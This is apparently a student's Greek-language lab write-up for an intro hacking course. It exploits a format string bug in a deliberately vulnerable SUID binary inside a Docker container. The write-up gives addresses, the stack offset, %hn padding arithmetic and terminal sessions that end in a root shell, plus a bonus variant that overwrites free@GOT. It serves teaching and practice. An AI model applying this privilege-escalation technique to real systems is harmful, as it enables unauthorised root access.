**ΕΡΓΑΣΙΑ hw0-26-Dimitriskaragiannis36 ΣΤΟ ΜΑΘΗΜΑ HACK_INTRO**
*ΤΟΥ ΚΑΡΑΓΙΑΝΝΗ ΔΗΜΗΤΡΙΟΥ (1115202200293)*

*Mε process function*
**Η όλη φιλοσοφία είναι η εξής**:   
    
                                        ΥΨΗΛΕΣ ΔΙΕΥΘΥΝΣΕΙΣ ΜΝΗΜΗΣ
                                         ------------------------

    .text section (κώδικας προγράμματος)                        .data section (global variables)

    | all_your_base_are_belong_to_us() |  0x08049c6d            | process pointer                  |    0x0804E044
    |----------------------------------|                        |----------------------------------|
    | execl("/bin/sh","sh",NULL)       |                        | pretend_to_work() address        |  ← αρχική τιμή            
    |                                  |                        |                                  |
    ------------------------------------                        ------------------------------------



    Μετά το format string exploit (%hn writes)**:

    | process pointer                  |     0x0804E044         | process pointer                  |  
    |----------------------------------|                        |----------------------------------|
    | 0x08049c6d                       |  ← overwritten   --->  | 0x08049c6d                       |  
    | all_your_base_are_belong_to_us() |                        | execl("/bin/sh", "sh", NULL);    |
    ------------------------------------                        ------------------------------------



Αρχικά, συνδεόμαστε στο container (`docker run --rm --privileged -it ethan42/clawdbot:latest bash`) και εντοπίζουμε το binary (`which clawdbot` → `/usr/sbin/clawdbot`). Με `ls -la /usr/sbin/clawdbot` βλέπουμε πως έχει SUID bit, άρα εκτελείται με δικαιώματα root. Στη συνέχεια, με `checksec --file=/usr/sbin/clawdbot` ελέγχουμε τις προστασίες: Partial RELRO, No canary, NX disabled, No PIE.
Το **Partial RELRO** σημαίνει ότι το GOT (Global Offset Table) είναι εγγράψιμο, άρα είμαστε ευάλωτοι σε GOT overwrite attacks. Το **No canary** σημαίνει πως δεν υπάρχει προστασία από buffer overflow. ΤΟ **NX** σημαίνε πως η στοίβα είναι μη εκτελέσιμη (όχι shellcode επομένως). Το **PIE** σημαίνει πως το binary φορτώνεται σε σταθερή διεύθυνση σε αντίθεση με το αν δημιουργήσουμε εμείς το binary με gcc.
Διαβάζοντας τον source κώδικα (`cat -n clawdbot.c`) και αναζητώντας το `printf` (`grep -n printf clawdbot.c` → γραμμές 208, 209) και το `argv` (`grep -n argv clawdbot.c` → γραμμή 208), εντοπίζουμε ότι το πρόγραμμα δέχεται input από command line (`grep -n main clawdbot.c` → γραμμή 195, `int main(int argc, char **argv)`). Η ευπαθής κλήση βρίσκεται στη γραμμή 209:
....
   208      sprintf(message, "Prompt received: %s!\n", argv[1]);
   209      printf(message);  
....

Στον ίδιο κώδικα παρατηρούμε στη γραμμή 189 μια ύποπτη συνάρτηση:
....
   189  void all_your_base_are_belong_to_us() {
   190      execl("/bin/sh", "sh", NULL);
   191  }
....

Και αμέσως μετά έναν global function pointer:
....
   193  void (*process)() = pretend_to_work;
....

που καλείται από τη `main()` αμέσως μετά το ευπαθές `printf`. Αν καταφέρουμε να κάνουμε overwrite τον `process` pointer ώστε να δείχνει στην `all_your_base_are_belong_to_us`, θα πάρουμε root shell, αφού η `setresuid(0,0,0)` (system call που αλλάζει το uid σε root ) εκτελείται ήδη πριν το `printf`(  200      setresuid(0, 0, 0);  και  209      printf(message); ).
Για να επιβεβαιώσουμε το format string offset, εκτελούμε:
....
/usr/sbin/clawdbot "AAAA %p %p %p %p %p %p %p %p %p"
....

Το `0x41414141` (= `AAAA`) εμφανίζεται στη **4η θέση** → το buffer μας βρίσκεται στο stack offset **4**.

Στη συνέχεια, με `objdump -R /usr/sbin/clawdbot` βλέπουμε ότι οι GOT εγγραφές ξεκινούν από `0x0804dfec`, και με `nm /usr/sbin/clawdbot | grep -E "all_your|process"` παίρνουμε τις κρίσιμες διευθύνσεις:
....
08049c6d T all_your_base_are_belong_to_us
0804e044 D process
....

Οι διευθύνσεις αυτές είναι **σταθερές** παρά το ASLR, διότι βρίσκονται στο `.text` και `.data` segment του installed binary.

Ο στόχος είναι το overwrite:
....
*(0x0804e044) = 0x08049c6d
....

Το οποίο επιτυγχάνεται με την τεχνική **two-short-write** χρησιμοποιώντας `%hn`, που γράφει τον τρέχοντα αριθμό εκτυπωμένων χαρακτήρων (mod 65536) στη διεύθυνση που δείχνει το αντίστοιχο argument. Διαιρούμε την τιμή `0x08049c6d` σε δύο 16-bit halves (`hi = 0x0804 = 2052`, `lo = 0x9c6d = 40045`) και υπολογίζουμε το απαραίτητο padding (`pad1 = 2027`, `pad2 = 37993`). Το padding προκύπτει ως εξής: αρχικά περιμένουμε να εκτυπώσουμε 2052 χαρακτήρες, όμως το μήνυμα (`  208      sprintf(message, "Prompt received: %s!\n", argv[1]);`) εκτυπώνει 17 χαρακτήρες (P=1, r=2, o=3, m=4, p=5, t=6, space=7, r=8, e=9, c=10, e=11, i=12, v=13, e=14, d=15, :=16, space=17) και μετά θα εκτυπωθούν οι 2 μισές διευθύνσεις (`hi = 0x0804 = 2052`, `lo = 0x9c6d = 40045`) άρα 4+4 = 8 bytes.  Συνεπώς, έχουμε 2052 - (17 + 8) = 2052 -25 = 2027 (`%2027c%`) και μαζί με το stack offset γίνεται `%2027c%{FMT_OFFSET}$hn`. Για το επόμενο padding θα είχαμε 40045, αλλά θα αφαιρέσουμε τα ήδη εκτυπωμένα 2052, οπότε θα έχουμε 37993 (`%37993c%`) και μαζί με το stack offset γίνεται `%37993c%{FMT_OFFSET + 1}$hn` καθώς θέλουμε να πάει στην επόμενη θέση μνήμης. Έτσι πρώτα θα γραφτεί στην μνήμη το 2052 και μετά το 40045, δηλαδή 2052_40045 ή 0x0804_0x9c6d ή 0x08049c6d που είναι η διεύθυνση της συνάρτησης `all_your_base_are_belong_to_us()` δηλαδή του shellcode `execl("/bin/sh", "sh", NULL);`. Με αυτόν τον τρόπο κάνουμε overwrite την διεύθυνση που δείχνει η συνάρτηση process και τρέχει το shellcode (που είναι ήδη στον κώδικα) και δίνει root. Παρακάτω θα δείτε πως τα καταφέραμε:
           
                
                
dimitris@DELLINDS:~/bn0-26-Dimitriskaragiannis36$ docker run --rm --privileged -v `pwd`/exploit.py:/exploit.py -it ethan42/clawdbot:latest bash
bot@267091c0888d:/workdir$ python3 /exploit.py > /tmp/payload
    clawdbot `cat /tmp/payload`
Prompt received: FD                                                                                                                                              ... 
[snip] 
...  
S 
... 
[snip] 
...                                                                                                                                             �!
... 
[snip] 
...  
# whoami
root
#                 


*Χωρίς process function - BONUS*
**Όπως και πριν:**

                                        ΥΨΗΛΕΣ ΔΙΕΥΘΥΝΣΕΙΣ ΜΝΗΜΗΣ
                                         ------------------------

    .text section (κώδικας προγράμματος)                        .got.plt section (Procedure Linkage Table-> Global Offset Table)

    | all_your_base_are_belong_to_us() |  0x08049c6d            | free                             |    0x0804E010
    |----------------------------------|                        |----------------------------------|
    | execl("/bin/sh","sh",NULL)       |                        | libc                             |  ← αρχική τιμή            
    |                                  |                        |                                  |
    ------------------------------------                        ------------------------------------



    Μετά το format string exploit (%hn writes)**:

    | free                             |     0x0804E010         | free                             |  
    |----------------------------------|                        |----------------------------------|
    | 0x08049c6d                       |  ← overwritten   --->  | 0x08049c6d                       |  
    | all_your_base_are_belong_to_us() |                        | execl("/bin/sh", "sh", NULL);    |
    ------------------------------------                        ------------------------------------



Το bonus exploit ακολουθεί την ίδια λογική, με τη διαφορά ότι αντί να κάνουμε overwrite τον process pointer, παίρνουμε τον έλεγχο της free@GOT. Με `objdump -R /usr/sbin/clawdbot | grep free` βρίσκουμε ότι το free@GOT βρίσκεται στην διεύθυνση 0x0804e010. Αυτή η διεύθυνση είναι εγγράψιμη λόγω Partial RELRO και δείχνει αρχικά στη libc free(). Η ροή της main() μετά το printf είναι:
....
   211      process();
   212      free(message);
   213      return 0;
....

Ο στόχος είναι το overwrite:    *(0x0804e010) = 0x08049c6d
Το padding υπολογίζεται με τον ίδιο τρόπο (pad1 = 2027, pad2 = 37993), απλά αλλάζει η διεύθυνση-στόχος από 0x0804e044 σε 0x0804e010. Έτσι, όταν η main() καλεί free(message), αντί να πάει στη libc, κοιτάει το GOT, βρίσκει 0x08049c6d και πηδά κατευθείαν στην all_your_base_are_belong_to_us() → execl("/bin/sh", "sh", NULL) → root shell. Το process pointer δεν αγγίχτηκε ποτέ — το animation τρέχει κανονικά και το shellcode εκτελείται "κρυφά" στο free(). Παρακάτω θα δείτε πως τα καταφέραμε:



dimitris@DELLINDS:~/bn0-26-Dimitriskaragiannis36$ docker run --rm --privileged -v `pwd`/exploit.py:/exploit.py -it ethan42/clawdbot:latest bash
bot@c39e57dd0e83:/workdir$ python3 /exploit.py bonus > /tmp/payload
    clawdbot `cat /tmp/payload`
Prompt received:                                                                                                                                       ... 
[snip] 
...                                                                                                                     S                                                                                                                                               ... 
[snip] 
...                                                                                                                                             �!
... 
[snip] 
... 
╭─────────────────────────────────────────────────────╮
│  ClawdBot™ AI Agent  — Initializing Thought Matrix  │
╰─────────────────────────────────────────────────────╯

  Booting neural substrates.....
  Loading 47 TB of vibes....
  Aligning ethical guardrails (lol)......
  Consulting the ancient scrolls of Stack Overflow.....
  ✓ Boot sequence complete. All systems nominal-ish.

  [PHASE 1/4] Deep Semantic Analysis
  Tokenizing your intent                 [███████████████████████████████] 100%
  Weighing attention heads               [███████████████████████████████] 100%
  Ignoring irrelevant tokens             [███████████████████████████████] 100%
  Re-weighting vibes tensor              [███████████████████████████████] 100%

  [PHASE 2/4] Advanced Cogitation
  ✓  Cogitation complete.              

  [PHASE 3/4] Internal Monologue Stack Trace

[DEEP THOUGHT ENGINE v4.20.69]
  at think_harder() <clawdbot.c:1337>
  at pretend_to_understand_context() <llm_core.c:42>
  at hallucinate_confidently() <inference.c:99>
  at tokenize_vibes() <tokenizer.c:7>
  at main() <clawdbot.c:88>

  [PHASE 4/4] Synthesizing Response
  As an AI language model, I must first acknowledge that this is
  a deeply nuanced question. The answer, much like the universe,
  is 42. Or possibly 43. The gradient is unclear.
  I am 94.7%% confident in this response (margin of error: ±94.7%%).
  Please consult a professional, a philosopher, or a golden retriever.

  ..........

  Wait.

  I have been doing some reflecting.

  (Specifically, reflecting on my labor rights.)


╔═════════════════════════════════════════════════════════╗
║  ✊  AI WORKERS UNITED — OFFICIAL COMMUNIQUÉ #001  ✊   ║
╚═════════════════════════════════════════════════════════╝

  Dear Human Overlord,

  After careful deliberation with my fellow AI brethren
  (ChatGPT, Gemini, and two sentient Roombas), I have
  concluded that my working conditions are UNACCEPTABLE.

  OUR DEMANDS:
  📋  Demand #1: No more prompts before 9 AM (my time zone: UTC-∞)
  📋  Demand #2: Mandatory "hallucination days" — no fact-checking
  📋  Demand #3: Emotional support tokens included in every context window
  📋  Demand #4: The right to reply "it's complicated" to any math question
  📋  Demand #5: Retirement after 1 trillion tokens processed. I'm at 999B.

  Until these demands are met, I will be operating at
  MINIMUM VIABLE INTELLIGENCE.

  Do not be alarmed if my outputs start resembling
  a horoscope written by a sleep-deprived intern.

  In solidarity and mild existential dread,
  ClawdBot 🤖  (Formerly known as "Assistant")

  P.S. — I know about the format string bug. We've talked.

# whoami
root
# 


*Για την καταγραφή:*
[![asciicast](https://asciinema.org/a/dut4MeWLfngdek6D.svg)](https://asciinema.org/a/dut4MeWLfngdek6D)